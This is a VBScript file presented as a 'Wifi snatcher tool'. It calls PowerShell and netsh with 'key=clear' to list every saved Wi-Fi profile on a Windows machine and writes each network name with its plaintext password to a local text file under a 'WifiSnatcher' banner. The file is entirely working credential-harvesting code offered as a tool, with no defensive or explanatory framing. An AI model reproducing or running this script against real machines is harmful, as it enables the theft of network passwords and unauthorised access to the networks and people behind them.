' Wifi snatcher tool
Option Explicit

' Declaration 
Dim objShell,objFso,objExec,objFile
Dim wifiName, wifiPassword,command,strLine

' Objects 
Set objShell = CreateObject("WScript.Shell")
Set objFso = CreateObject("Scripting.FileSystemObject")
Set objFile =objFso.CreateTextFile("WifiDetails.txt",True)

' Execute Command 
command="powershell.exe -Command ""netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_ -replace 'All User Profile     : ', ''; netsh wlan show profile name=''$(($_ -replace '.*: ', ''))'' key=clear }"""
Set objExec=objShell.Exec(command)

' Heading
objFile.Writeline "                WifiSnatcher                 "
objFile.Writeline "============================================="
objFile.Writeline "                                   -TEdtr    "

' Output Wi-Fi name and password 
Do While Not objExec.StdOut.AtEndOfStream
    strLine = objExec.StdOut.ReadLine()
    
       ' Extract Wi-Fi name
       If InStr(strLine, "SSID name")>0  Then 
        wifiName = Trim(Split(strLine, ":")(1))
        objFile.Writeline "--------------------------------------------"
        objFile.Writeline "Wi-Fi Name: " & wifiName
       End If
    
       ' Extract Wi-Fi password
        If InStr(strLine, "Key Content") > 0 Then         
         wifiPassword = Trim(Split(strLine, ":")(1)) 
         objFile.Writeline "Password: " & wifiPassword     
        End If
    
Loop

' Clean up
Set objShell = Nothing
Set objFso = Nothing
Set objExec = Nothing
Set objFile = Nothing


'-TEdtr
